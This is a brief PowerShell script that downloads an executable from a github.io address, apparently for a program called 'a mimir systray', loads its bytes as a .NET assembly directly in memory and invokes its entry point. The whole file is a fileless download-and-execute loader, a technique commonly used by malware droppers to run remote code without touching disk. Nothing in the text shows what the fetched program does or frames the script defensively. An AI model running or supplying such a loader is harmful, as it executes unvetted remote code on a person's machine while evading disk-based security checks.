# URL of the executable
$url = "https://amimirsoftware.github.io/a%20mimir%20systray.exe"

# Download the executable into memory
$response = Invoke-WebRequest -Uri $url -UseBasicParsing
$bytes = $response.Content

# Convert bytes to an executable in memory and execute it
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPoint = $assembly.EntryPoint
if ($entryPoint) {
    $entryPoint.Invoke($null, (, [string[]]@()))
}
